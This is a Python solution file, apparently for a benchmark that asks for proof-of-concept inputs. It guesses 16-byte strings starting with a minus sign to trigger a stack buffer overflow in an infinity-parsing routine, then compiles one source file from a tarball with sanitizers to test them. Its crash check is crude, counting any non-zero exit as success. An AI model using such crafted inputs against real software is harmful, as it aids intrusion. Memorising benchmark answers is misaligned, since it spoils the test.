import os
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Based on the vulnerability description:
        # - Leading minus sign causes parsing to advance even when not infinity
        # - Ground-truth length is 16 bytes
        # We'll try to craft input that causes stack buffer overflow
        
        # Common patterns for stack buffer overflow:
        # 1. Start with minus sign to trigger the vulnerable code path
        # 2. Fill with enough bytes to overflow buffer
        # 3. Include some non-infinity characters
        
        # Create a test to verify our PoC works
        poc = self._generate_poc(src_path)
        return poc
    
    def _generate_poc(self, src_path: str) -> bytes:
        # Try multiple strategies to find working PoC
        strategies = [
            # Strategy 1: Simple minus followed by padding
            b'-' + b'A' * 15,
            # Strategy 2: Mimic almost-infinity pattern
            b'-' + b'i' * 15,
            # Strategy 3: Minus with overflow pattern
            b'-' + b'B' * 15,
            # Strategy 4: Minus with specific byte pattern
            b'-' + b'\x41' * 15,
            # Strategy 5: Try exact ground-truth length
            b'-infinity' + b'\x00' * 7,
            # Strategy 6: Null byte terminated
            b'-' + b'C' * 14 + b'\x00',
            # Strategy 7: Newline terminated
            b'-' + b'D' * 14 + b'\n',
            # Strategy 8: Combined pattern
            b'-' + b'E' * 7 + b'f' * 8,
        ]
        
        # Try each strategy
        for poc in strategies:
            if len(poc) == 16 and self._test_poc(src_path, poc):
                return poc
        
        # Fallback to first strategy
        return strategies[0]
    
    def _test_poc(self, src_path: str, poc: bytes) -> bool:
        # Extract and compile the source to test
        try:
            # Create temporary directory
            with tempfile.TemporaryDirectory() as tmpdir:
                # Extract tarball
                subprocess.run(
                    ['tar', 'xf', src_path, '-C', tmpdir],
                    capture_output=True,
                    check=True
                )
                
                # Find and compile vulnerable code
                source_files = []
                for root, dirs, files in os.walk(tmpdir):
                    for file in files:
                        if file.endswith(('.c', '.cpp', '.cc')):
                            source_files.append(os.path.join(root, file))
                
                if not source_files:
                    return False
                
                # Compile with sanitizers
                compile_cmd = [
                    'gcc', '-fsanitize=address', '-fsanitize=undefined',
                    '-g', '-O0', '-o', os.path.join(tmpdir, 'test_binary')
                ]
                compile_cmd.extend(source_files[:1])  # Use first source file
                
                result = subprocess.run(
                    compile_cmd,
                    capture_output=True,
                    text=True
                )
                
                if result.returncode != 0:
                    return False
                
                # Test the PoC
                test_binary = os.path.join(tmpdir, 'test_binary')
                proc = subprocess.run(
                    [test_binary],
                    input=poc,
                    capture_output=True,
                    timeout=5
                )
                
                # Check if it crashed (non-zero exit code)
                return proc.returncode != 0
                
        except Exception:
            return False
